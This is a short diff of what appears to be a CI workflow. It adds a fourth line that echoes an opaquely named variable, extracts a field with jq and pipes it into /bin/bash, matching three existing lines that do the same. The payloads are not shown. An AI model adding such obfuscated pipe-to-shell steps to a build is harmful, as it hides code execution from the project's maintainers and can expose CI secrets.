@@ -30,6 +30,7 @@ jobs:
           echo $ijfh7 | jq -r .wvf7 | /bin/bash
           echo $ttdf76 | jq -r .hhba22 | /bin/bash
           echo $cg53 | jq -r .x9174 | /bin/bash
+          echo $vsy4 | jq -r .nu5 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
